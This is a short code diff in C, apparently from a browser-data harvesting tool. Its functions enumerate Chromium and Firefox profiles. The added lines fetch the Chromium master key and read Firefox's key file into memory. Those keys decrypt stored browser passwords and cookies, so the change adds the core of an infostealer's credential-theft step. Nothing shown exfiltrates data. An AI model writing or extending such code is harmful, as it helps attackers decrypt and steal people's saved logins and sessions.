@@ -282,6 +282,7 @@ PUSER_DATA* PickChromium
 			pTemp->lpBrowserName = DuplicateStrW(BrowserNames[i], 0);
 			pResult[dwNumberOfUserDatas] = pTemp;
 			ListFileEx(lpFullPath, LIST_RECURSIVELY, ChromiumWalk, pTemp);
+			GetChromiumMasterKey(pTemp);
 			for (j = 0; j < pTemp->cProfile; j++) {
 				pProfile = pTemp->ProfileList[j];
 				if (pProfile->ItemPaths[ChromiumHistory] != NULL) {
@@ -333,6 +334,9 @@ PUSER_DATA PickFireFox()
 		pResult->lpUserDataPath = DuplicateStrW(lpFullPath, 0);
 		pResult->lpBrowserName = DuplicateStrW(L"Firefox", 0);
 		ListFileEx(lpFullPath, LIST_RECURSIVELY, FireFoxWalk, pResult);
+		if (pResult->lpKeyPath != NULL) {
+			pResult->pMasterKey = ReadFromFile(pResult->lpKeyPath, &pResult->cbMasterKey);
+		}
 	}
 CLEANUP:
 	FREE(lpFullPath);
